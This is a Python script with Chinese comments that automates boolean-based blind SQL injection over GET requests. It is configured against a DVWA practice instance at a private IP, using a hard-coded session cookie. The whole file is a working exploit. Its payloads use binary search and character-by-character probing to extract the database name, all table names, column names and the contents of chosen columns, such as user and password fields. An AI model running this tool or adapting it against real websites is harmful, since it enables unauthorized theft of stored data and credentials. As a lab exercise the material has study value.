#!/usr/bin/python3
# coding=utf-8

"""
functions for boolean-based sql injection(GET)

:copyright: Copyright (c) 2021, Fancy Xiang. All rights reserved.
:license: GNU General Public License v3.0, see LICENSE for more details.
"""

import requests

url = "http://192.168.101.16/dvwa/vulnerabilities/sqli_blind"               #有可利用漏洞的url，根据实际情况填写
headers={ "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",}    #http request报文头部，根据实际情况填写
cookies={"security": "low", "PHPSESSID": "07bucms1va26di95pntpl9qm57"}          #单个cookie的情况可以直接写在headers中，两个cookie的情况要用字典形式的cookies参数
 
keylist = [chr(i) for i in range(33, 127)]                                     #包括数字、大小写字母、可见特殊字符
flag = 'User ID exists in the database'                                        #用于判断附加sql语句为真的字符，根据网页回显填写

def CurrentDatabaseGET():
    n = 10                                                                      #预测当前数据库名称最大可能的长度，根据实际情况填写
    k = 0
    j = n//2 
    length = 0
    db = str()
    while True:
        if j>k and j<n and j-k>3:
            payload1 = "1' and length(database())>"+str(j)+"-- ss"           #所有payload根据实际情况填写
            param = {
            "id":payload1,
            "Submit":"Submit",
            }
            response = requests.get(url, params = param, headers = headers, cookies = cookies)     #GET方法发送含payload的request
            #print(response.request.headers)
            #print(response.text)
            if response.text.find(flag) != -1:
                n=n
                k=j
            else:
                k=k
                n=j
            j=(n-k)//2
        elif j-k==3 or j-k<3:
            for i in range(k-1,n+2):
                payload2 = "1' and length(database())="+str(i)+"-- ss"
                param = {
                "id":payload2,
                "Submit":"Submit",
                }
                response = requests.get(url, params = param, headers = headers, cookies = cookies)
                if response.text.find(flag) != -1:
                    length = i
                    break
            break
        else:
            break
    print("the name of current database contains "+str(length)+" characters")
    
    for i in range(1,length+1):
        for c in keylist:
            payload3 = "1' and substring(database(),"+str(i)+",1)='"+c+"'-- ss"
            param = {
            "id":payload3,
            "Submit":"Submit",
            }
            response = requests.get(url, params = param, headers = headers, cookies = cookies)
            if response.text.find(flag) != -1:
                db = db+c
                break
    print("the name of current database is "+str(db))
    
def TablesGET():
    n = 100                                                                     #预测当前数据库中所有表名称最大可能的长度，根据实际情况填写
    k = 0
    j = n//2
    length = 0
    tname = str()
    while True:
        if j>k and j<n and j-k>3:
            payload4 = "1' and (length((select group_concat(table_name) from information_schema.tables where table_schema = database())))>"+str(j)+"-- ss"
            param = {
            "id":payload4,
            "Submit":"Submit",
            }
            response = requests.get(url, params = param, headers = headers, cookies = cookies)
            if response.text.find(flag) != -1:
                n=n
                k=j
            else:
                k=k
                n=j
            j=(n-k)//2
        elif j-k==3 or j-k<3:
            for i in range(k-1,n+2):
                payload5 = "1' and (length((select group_concat(table_name) from information_schema.tables where table_schema = database())))="+str(i)+"-- ss"
                param = {
                "id":payload5,
                "Submit":"Submit",
                }
                response = requests.get(url, params = param, headers = headers, cookies = cookies)
                if response.text.find(flag) != -1:
                    length = i
                    break
            break
        else:
            break
    print("the name of all tables in current database contains "+str(length)+" characters")
    
    for i in range(1,length+1):
        for c in keylist:
            payload6 = "1' and substr((select group_concat(table_name) from information_schema.tables where table_schema = database()),"+str(i)+",1)='"+c+"'-- ss"
            param = {
            "id":payload6,
            "Submit":"Submit",
            }
            response = requests.get(url, params = param, headers = headers, cookies = cookies)
            if response.text.find(flag) != -1:
                tname = tname+c
                break
    print("the name of all tables in current database is "+str(tname))


def ColumnsGET(table):                                                          #table参数是需要爆破的数据表名称，记得加单引号
    n = 200                                                                     #预测某个表所有列名称最大可能的长度，根据实际情况填写
    k = 0
    j = n//2
    length = 0
    cname = str()
    while True:
        if j>k and j<n and j-k>3:
            payload7 = "1' and (length((select group_concat(column_name) from information_schema.columns where table_name = '"+table+"')))>"+str(j)+"-- ss"
            param = {
            "id":payload7,
            "Submit":"Submit",
            }
            response = requests.get(url, params = param, headers = headers, cookies = cookies)
            if response.text.find(flag) != -1:
                n=n
                k=j
            else:
                k=k
                n=j
            j=(n-k)//2
        elif j-k==3 or j-k<3:
            for i in range(k-1,n+2):
                payload8 = "1' and (length((select group_concat(column_name) from information_schema.columns where table_name = '"+table+"')))="+str(i)+"-- ss"
                param = {
                "id":payload8,
                "Submit":"Submit",
                }
                response = requests.get(url, params = param, headers = headers, cookies = cookies)
                if response.text.find(flag) != -1:
                    length = i
                    break
            break
        else:
            break
    print("the name of all columns in current table contains "+str(length)+" characters")
    
    for i in range(1,length+1):
        for c in keylist:
            payload9 = "1' and substr((select group_concat(column_name) from information_schema.columns where table_name = '"+table+"'),"+str(i)+",1)='"+c+"'-- ss"
            param = {
            "id":payload9,
            "Submit":"Submit",
            }
            response = requests.get(url, params = param, headers = headers, cookies = cookies)
            if response.text.find(flag) != -1:
                cname = cname+c
                break
    print("the name of all columns in current table is "+str(cname))

def ContentGET(table,col1,col2):                                                #table参数是需要爆破的数据表名称，col1和col2是需要爆破内容的列，记得都要加单引号
    n = 200                                                                     #预测期望获取的数据的最大可能的长度，根据实际情况填写
    k = 0
    j = n//2
    length = 0
    content = str()
    while True:
        if j>k and j<n and j-k>3:
            payload10 = "1' and (length((select group_concat(concat("+col1+",'^',"+col2+")) from "+table+")))>"+str(j)+"-- ss"
            param = {
            "id":payload10,
            "Submit":"Submit",
            }
            response = requests.get(url, params = param, headers = headers, cookies = cookies)
            if response.text.find(flag) != -1:
                n=n
                k=j
            else:
                k=k
                n=j
            j=(n-k)//2
        elif j-k==3 or j-k<3:
            for i in range(k-1,n+2):
                payload11 = "1' and (length((select group_concat(concat("+col1+",'^',"+col2+")) from "+table+")))="+str(i)+"-- ss"
                param = {
                "id":payload11,
                "Submit":"Submit",
                }
                response = requests.get(url, params = param, headers = headers, cookies = cookies)
                if response.text.find(flag) != -1:
                    length = i
                    break
            break
        else:
            break
    print("the content contains "+str(length)+" characters")
    
    for i in range(1,length+1):
        for c in keylist:
            payload12 = "1' and substr((select group_concat(concat("+col1+",'^',"+col2+")) from "+table+"),"+str(i)+",1)='"+c+"'-- ss"
            param = {
            "id":payload12,
            "Submit":"Submit",
            }
            response = requests.get(url, params = param, headers = headers, cookies = cookies)
            if response.text.find(flag) != -1:
                content = content+c
                break
    print("the content is "+str(content))